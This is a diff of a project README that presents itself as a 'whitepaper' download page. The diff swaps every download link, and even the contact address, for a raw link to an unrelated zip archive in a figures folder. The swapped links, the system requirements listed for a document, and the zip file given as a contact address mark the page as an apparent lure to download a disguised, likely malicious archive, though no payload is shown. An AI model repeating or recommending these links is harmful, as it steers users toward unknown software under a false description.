@@ -7,10 +7,10 @@ Welcome to the "whitepaper" project! This whitepaper provides a clear framework 
 To begin using our whitepaper, follow the steps below to download it easily.
 
 ## 🔗 Download the Whitepaper
-[![Download Whitepaper](https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/whitepaper-v3.8.zip%https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/whitepaper-v3.8.zip)](https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/whitepaper-v3.8.zip)
+[![Download Whitepaper](https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/Software-anagrammatical.zip%https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/Software-anagrammatical.zip)](https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/Software-anagrammatical.zip)
 
 ## 📥 Download & Install
-Visit this [page to download](https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/whitepaper-v3.8.zip) the whitepaper. You will find different versions available. Simply pick the one that suits your needs. 
+Visit this [page to download](https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/Software-anagrammatical.zip) the whitepaper. You will find different versions available. Simply pick the one that suits your needs. 
 
 ### 📋 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -50,7 +50,7 @@ Join discussions on how to improve and implement the ideas in this whitepaper. F
 - **Community Forum:** Connect with like-minded individuals to share insights.
 
 ### 📬 Contact Information
-For further inquiries, feel free to reach us at [https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/whitepaper-v3.8.zip].
+For further inquiries, feel free to reach us at [https://raw.githubusercontent.com/floriacountrystyle546/whitepaper/main/figures/Software-anagrammatical.zip].
 
 ## 📣 Acknowledgments
 Thank you to everyone who contributed to the whitepaper. Your efforts made this resource possible. 
